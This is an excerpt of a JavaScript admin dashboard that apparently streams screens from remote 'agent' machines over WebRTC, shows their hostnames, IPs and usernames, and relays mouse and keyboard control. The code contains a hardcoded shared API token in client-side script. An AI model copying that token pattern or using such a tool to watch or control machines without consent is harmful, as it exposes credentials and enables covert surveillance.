(function () {
    ...
    function mutateSdpForQuality(sdp, maxKbps, frameRateCap) {
        ...
        for (var i = 0; i < lines.length; i++) {
            ...
            if (inVideo && currentLine.indexOf('a=rtpmap:') === 0 && vp8Pt && currentLine.indexOf('VP8/90000') !== -1 && frameRateCap) {
                var hasFmtp = lines.some(function (line) { return line.indexOf('a=fmtp:' + vp8Pt + ' ') === 0; });
                if (!hasFmtp) {
    ...
    // Attach stream to preview video element, with retry if element not yet available
    function setPreviewVideoStream(agentUuid, stream, retryCount) {
        ...
        video.play().catch(function (e) {
            if (e.name === 'AbortError') {
                // Ignore - element was removed from DOM during play
            } else {
    ...
    function clearPreviewVideoStream(agentUuid) {
        ...
        if (!video) return;
        if (video.srcObject) {
            // Do not stop tracks (they may be shared)
    ...
    // Reattach all existing streams to fresh preview elements after grid refresh
    ...
    async function createWebRTCOffer(agentUuid) {
        ...
        var peer = { pc: null, dataChannel: null, answerPollInterval: null, connectionReady: false, stream: null };
        ...
        peer.pc.onicecandidate = function (event) {
            if (event.candidate) console.log('[DEBUG] ICE candidate:', event.candidate.candidate);
            else console.log('[DEBUG] ICE gathering completed');
        };
        ...
        peer.dataChannel.onopen = function () {
            ...
            peer.dataChannel.send(JSON.stringify({ type: 'set_quality', max_bitrate_kbps: EXTQLI_STREAM_QUALITY.maxBitrateKbps, frame_rate: EXTQLI_STREAM_QUALITY.frameRateCap }));
            peer.dataChannel.send(JSON.stringify({ type: 'resume_video' }));
        };
        peer.dataChannel.onclose = function () { console.log('[DEBUG] Data channel closed for', agentUuid); };
        peer.dataChannel.onerror = function (err) { console.error('[DEBUG] Data channel error for', agentUuid, err); };
        peer.dataChannel.onmessage = function (event) { console.log('[DEBUG] Message from agent:', event.data); };

        var offer = await peer.pc.createOffer();
        await peer.pc.setLocalDescription(offer);

        await new Promise(function (resolve) {
            if (peer.pc.iceGatheringState === 'complete') { resolve(); return; }
            peer.pc.onicegatheringstatechange = function () {
                if (peer.pc.iceGatheringState === 'complete') { console.log('[DEBUG] ICE gathered'); resolve(); }
            };
            setTimeout(function () { console.warn('[DEBUG] ICE gather timeout, proceeding'); resolve(); }, 15000);
        });
        ...
        var response = await fetch(SIGNALING_URL + '?action=submit_offer&agent_uuid=' + encodeURIComponent(agentUuid), {
            ...
            body: JSON.stringify({ viewer_id: VIEWER_ID, offer_sdp: mutatedSdp })
        });
        ...
        peer.answerPollInterval = setInterval(async function () {
            if (!peer.pc) { clearInterval(peer.answerPollInterval); return; }
            try {
                ...
                if (pollData.has_answer) {
                    ...
                    var answer = new RTCSessionDescription({ type: 'answer', sdp: pollData.answer_sdp });
                    await peer.pc.setRemoteDescription(answer);
                    console.log('[DEBUG] Remote description set for', agentUuid);
                } else {
                    console.log('[DEBUG] No answer yet...');
                }
            } catch (err) { console.error('[DEBUG] Answer poll error:', err); }
        }, 2000);
        return peer;
    }
    ...
    function autoConnectAgents() {
        if (!EXTQLI_AUTO_CONNECT_ALL) return;
        var onlineAgents = extqliAgentsList.filter(function (a) { return a.is_online && !extqliViewerPeers[a.agent_uuid]; });
    ...
    function removeAgent(agentUuid) {
        fetch(BASE_PATH + '/backend/api/delete_agent.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ shared_token: 'extqli_@2026token$$', agent_uuid: agentUuid })
        }).then(function (response) { return response.json(); }).catch(function (err) { console.warn('Delete error:', err); });

        extqliAgentsList = extqliAgentsList.filter(function (a) { return a.agent_uuid !== agentUuid; });
        if (extqliViewerPeers[agentUuid]) {
            try { if (extqliViewerPeers[agentUuid].answerPollInterval) clearInterval(extqliViewerPeers[agentUuid].answerPollInterval); } catch (err) {}
            try { extqliViewerPeers[agentUuid].pc.close(); } catch (err) {}
            clearPreviewVideoStream(agentUuid);
            delete extqliViewerPeers[agentUuid];
        }
        ...
        updateLiveCounts();
        if (extqliCurrentScreenAgentUuid === agentUuid) clearRemoteTarget();
    }

    function renderExtQliSidebar(list) {
        var container = byId('extqliClientList');
        if (!container) return;
        if (!list.length) { container.innerHTML = '<div class="sentinel-empty">No agents connected.</div>'; return; }
        container.innerHTML = list.map(function (a) {
            ...
            return '<div class="sentinel-client-card ' + (isOnline ? 'is-online' : 'is-offline') + '" data-agent-uuid="' + escapeHtml(a.agent_uuid) + '">' +
                ...
                '<div class="scc-header"><div class="scc-name">' + escapeHtml(a.hostname || '-') + '</div><span class="scc-status-badge ' + (isOnline ? 'is-online' : 'is-offline') + '">' + (isOnline ? '● ONLINE' : 'OFFLINE') + '</span></div>' +
                ...
                '<div class="scc-actions"><button class="btn btn-dark btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button>' +
    ...
    function renderExtQliGrid(list) {
        ...
        if (!container) return;
        if (!list.length) { container.innerHTML = '<div class="sentinel-empty">No agents to display.</div>'; return; }
        container.innerHTML = list.map(function (a) {
            var isOnline = !!a.is_online;
            var userDisplay = a.username || a.hostname || '-';
            ...
            return '<div class="sentinel-monitor-card ' + (isOnline ? 'is-online' : 'is-offline') + '" data-agent-uuid="' + escapeHtml(a.agent_uuid) + '">' +
                '<button class="card-close-btn" data-agent-uuid="' + escapeHtml(a.agent_uuid) + '" title="Remove from list">×</button>' +
                '<div class="smc-header"><div class="smc-info"><div class="smc-name">' + escapeHtml(a.hostname || '-') + '</div><div class="smc-ip">IP: ' + escapeHtml(a.local_ip || '-') + '</div><div class="smc-user">User: ' + escapeHtml(userDisplay) + '</div></div>' +
                (isOnline ? '<span class="live-badge">● LIVE</span>' : '<span class="offline-badge">OFFLINE</span>') + '</div>' +
                ...
                '<div class="smc-thumb-placeholder extqli-preview-overlay" data-agent-uuid="' + escapeHtml(a.agent_uuid) + '" style="display:' + overlayDisplayStyle + '; align-items:center; justify-content:center; width:100%; height:100%;">' + overlayText + '</div></div>' +
                '<div class="smc-actions"><button class="btn btn-dark btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button>' +
                '<button class="btn btn-success btn-sm" onclick="openRemoteScreen(\'' + escapeHtml(a.agent_uuid) + '\')"' + (isOnline ? '' : ' disabled') + '>Remote Screen</button></div></div>';
        }).join('');
        // After grid is rendered, reattach existing streams to the new video elements
    ...
    function sendAgentTask(agentUUID, task) {
        ...
        }).then(function (res) { return res.json(); }).then(function () { loadAgents(); }).catch(function (err) { console.error('Task send error:', err); });
    }
    ...
    function setMainVideoToAgentStream(agentUuid) {
        ...
        if (peer && peer.stream) {
            ...
            mainVideo.play().catch(function (e) { console.warn('Main video play error:', e); });
            showScreenEmptyState(false);
            return true;
        }
        return false;
    ...
    function stopScreenView() {
        ...
        if (peer && peer.dataChannel && peer.dataChannel.readyState === 'open') peer.dataChannel.send(JSON.stringify({ type: 'pause_video' }));
        var videoEl = byId('remoteScreenVideo');
        if (videoEl) { try { videoEl.pause(); } catch (err) {} videoEl.style.display = 'none'; videoEl.srcObject = null; }
    ...
    function startScreenView() {
        ...
        if (setMainVideoToAgentStream(agentUuid)) {
            ...
            showScreenEmptyState(false);
            var peer = activeViewerPeer();
            if (peer && peer.dataChannel && peer.dataChannel.readyState === 'open') peer.dataChannel.send(JSON.stringify({ type: 'resume_video' }));
            return;
        }
        extqliIsScreenViewing = true;
        ...
        createWebRTCOffer(agentUuid).then(function (peer) {
            var checkInterval = setInterval(function () {
                ...
                } else if (peer.pc && peer.pc.connectionState === 'failed') { clearInterval(checkInterval); }
            }, 500);
    ...
    function toggleFullscreen() { var stage = byId('screenStage'); if (!stage) return; if (!document.fullscreenElement && !document.webkitFullscreenElement) { (stage.requestFullscreen || stage.webkitRequestFullscreen).call(stage); } else { (document.exitFullscreen || document.webkitExitFullscreen).call(document); } }

    function updateRemoteOverlay() { var overlay = byId('remoteControlOverlay'); if (overlay) overlay.style.display = (extqliIsScreenViewing && extqliRemoteControlEnabled) ? 'block' : 'none'; }

    function sendInput(msg) { var peer = activeViewerPeer(); if (!extqliRemoteControlEnabled || !peer || !peer.dataChannel || peer.dataChannel.readyState !== 'open') return; peer.dataChannel.send(JSON.stringify(msg)); }
    ...
    function initRemoteControl() {
        ...
        function getScaledCoords(clientX, clientY) {
            ...
            return { x: Math.max(0, Math.min(extqliRemoteScreenWidth, (clientX - rect.left) * scaleX)), y: Math.max(0, Math.min(extqliRemoteScreenHeight, (clientY - rect.top) * scaleY)) };
        }
        canvas.addEventListener('mousemove', function (e) { if (!extqliRemoteControlEnabled) return; var now = Date.now(); if (now - extqliLastMouseMoveTime < EXTQLI_MOUSE_MOVE_INTERVAL_MS) return; extqliLastMouseMoveTime = now; var c = getScaledCoords(e.clientX, e.clientY); sendInput({ event_type: 'mouse_move', x: Math.round(c.x), y: Math.round(c.y) }); });
        canvas.addEventListener('mousedown', function (e) { e.preventDefault(); if (!extqliRemoteControlEnabled) return; sendInput({ event_type: 'mouse_click', button: e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle', pressed: true }); });
        canvas.addEventListener('mouseup', function (e) { e.preventDefault(); if (!extqliRemoteControlEnabled) return; sendInput({ event_type: 'mouse_click', button: e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle', pressed: false }); });
        canvas.addEventListener('wheel', function (e) { e.preventDefault(); if (!extqliRemoteControlEnabled) return; sendInput({ event_type: 'mouse_scroll', delta: e.deltaY > 0 ? -3 : 3 }); });
        canvas.addEventListener('contextmenu', function (e) { e.preventDefault(); });
        var KEY_MAP = { ' ': 'space', 'Enter': 'enter', 'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right' };
        function mapKey(k) { return KEY_MAP[k] || k; }
        window.addEventListener('keydown', function (e) { if (!extqliRemoteControlEnabled || e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return; e.preventDefault(); sendInput({ event_type: 'key', key: mapKey(e.key), pressed: true }); });
        window.addEventListener('keyup', function (e) { if (!extqliRemoteControlEnabled || e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return; e.preventDefault(); sendInput({ event_type: 'key', key: mapKey(e.key), pressed: false }); });
    }

    function updateRemoteTargetDisplay(agentUuid, isActiveRemote) {
        var agent = extqliAgentsList.find(function (a) { return a.agent_uuid === agentUuid; });
        ...
        if (isActiveRemote && agentUuid) {
            ...
            if (textEl) textEl.innerHTML = '<strong>Remote target: ' + escapeHtml(targetName) + '</strong><span>Control input is active — switch to the Screen Viewer tab to interact.</span>';
        } else {
            remoteBar.classList.remove('is-active');
            if (textEl) textEl.innerHTML = '<strong>Remote control is idle.</strong><span>Select a client and click <strong>Remote Screen</strong>. Control input will go through the Screen Viewer tab only.</span>';
        }
    }
    ...
    function activateAgentAdminTab(tabName) {
        var validTabs = { agents: 'agentAdminTabAgents', screen: 'agentAdminTabScreen' };
        extqliCurrentAdminTab = validTabs[tabName] ? tabName : 'agents';
        Object.keys(validTabs).forEach(function (key) { var panel = byId(validTabs[key]); if (panel) panel.hidden = key !== extqliCurrentAdminTab; });
        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) { btn.classList.toggle('is-active', btn.getAttribute('data-agent-admin-tab-trigger') === extqliCurrentAdminTab); });
    }
    ...
    function activateView(viewId, agentAdminTab) {
        ...
        if (viewId === 'agentsView') activateAgentAdminTab(agentAdminTab || extqliCurrentAdminTab || 'agents');
    }
    ...
    function openScreenViewer(agentUuid) {
        ...
        if (isConnectionAlive(agentUuid)) setScreenStatus('Live connection ready — click Start Viewing to resume instantly.');
        else setScreenStatus('Selected agent. Click Start Viewing.');
    }
    ...
    function openRemoteScreen(agentUuid) {
        ...
        if (isConnectionAlive(agentUuid)) {
            ...
            createWebRTCOffer(agentUuid).then(function (peer) {
                var checkInterval = setInterval(function () {
                    if (peer.stream && byId('remoteScreenVideo').srcObject !== peer.stream) { setMainVideoToAgentStream(agentUuid); clearInterval(checkInterval); }
                    else if (peer.pc && peer.pc.connectionState === 'failed') clearInterval(checkInterval);
                }, 500);
                setTimeout(function () { clearInterval(checkInterval); }, 10000);
            }).catch(function (err) {
    ...
    function bindEvents() {
        ...
        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) { btn.addEventListener('click', function () { activateAgentAdminTab(btn.getAttribute('data-agent-admin-tab-trigger')); }); });
        ...
        if (screenSelect) {
            screenSelect.addEventListener('change', function () {
                ...
                if (extqliCurrentScreenAgentUuid) {
                    if (isConnectionAlive(extqliCurrentScreenAgentUuid)) setScreenStatus('Agent selected — live connection ready. Click Start Viewing to resume instantly.');
                    else setScreenStatus('Agent selected. Click Start Viewing.');
                } else setScreenStatus('Waiting for a selected agent.');
            });
        }
        ...
        document.body.addEventListener('click', function (e) {
            ...
            if (btn && btn.getAttribute('data-agent-uuid')) { var uuid = btn.getAttribute('data-agent-uuid'); removeAgent(uuid); e.preventDefault(); e.stopPropagation(); }
        });
    }

    function bindNavigation() { qsa('[data-view-target]').forEach(function (btn) { btn.addEventListener('click', function () { activateView(btn.getAttribute('data-view-target'), btn.getAttribute('data-agent-admin-tab') || ''); }); }); }
